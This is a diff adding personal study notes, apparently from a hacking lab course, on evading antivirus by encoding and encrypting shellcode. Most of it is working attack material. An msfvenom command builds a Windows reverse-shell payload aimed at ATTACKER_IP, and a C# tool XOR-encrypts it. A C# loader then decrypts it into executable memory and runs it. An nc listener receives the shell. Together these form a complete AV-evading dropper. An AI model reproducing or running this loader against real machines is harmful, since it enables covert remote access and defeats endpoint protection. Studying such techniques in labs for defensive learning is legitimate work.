@@ -159,3 +159,142 @@ staged vs. stageless
 stagers in metasploit
 stageless: windows/x64/shell_reverse_tcp
 staged: windows/x64/shell/reverse_tcp
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+Intro to Encoding and Encryption
+
+Encoding: process of chanign the data from original state to other formats using algorithm
+-useful in program compiling and execution, data storage and transmission, data processing/conversion
+-AV: used to hide shellcode strings within binary
+-AV checks encoded string by decoding and checking original form
+
+Encryption: prevention of unauthorized access and manipulation of data
+-converting planetext(unencrypted content) into encrypted version called Ciphertext
+-Ciphertext cannot be read or decrypted withough a key and alogrithm used
+
+-AV software blocklist most public tools (Metasploit)
+-AV high detection rate for public tools
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+Shellcode Encoding and Encryption
+
+-Create custom payload
+msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp > value.txt
+
+
+-put on windows machine
+smbclient -U thm '//IP/Tools'
+put value.txt
+
+-COPY VALUE
+
+-Encode on Encryptor.cs
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Encrypter
+{
+    internal class Program
+    {
+        private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+        static void Main(string[] args)
+        {
+            //XOR Key - It has to be the same in the Droppr for Decrypting
+            string key = "THMK3y123!";
+
+            //Convert Key into bytes
+            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+            //Original Shellcode here (csharp format)
+            byte[] buf = new byte[460] { PASTE VALUE };
+
+            //XORing byte by byte and saving into a new array of bytes
+            byte[] encoded = xor(buf, keyBytes);
+            Console.WriteLine(Convert.ToBase64String(encoded));        
+        }
+    }
+}
+
+-compile on Windows machine
+csc.exe Encrypter.cs
+-run Encryptor.exe
+.\Encryptor.exe
+-COPY VALUE
+
+-open decoder EncStageless.cs
+using System;
+using System.Net;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+  
+  private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+  public static void Main()
+  {
+
+    string dataBS64 = "PASTE VALUE";
+    byte[] data = Convert.FromBase64String(dataBS64);
+
+    string key = "THMK3y123!";
+    //Convert Key into bytes
+    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+    byte[] encoded = xor(data, keyBytes);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+
+-compile EncStageless.cs
+csc.exe EncStageless.cs
+
+-on attackbox 
+nc -lvp 443
+
+-on windows machine
+-run file
+.\EncStageless.exe
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+
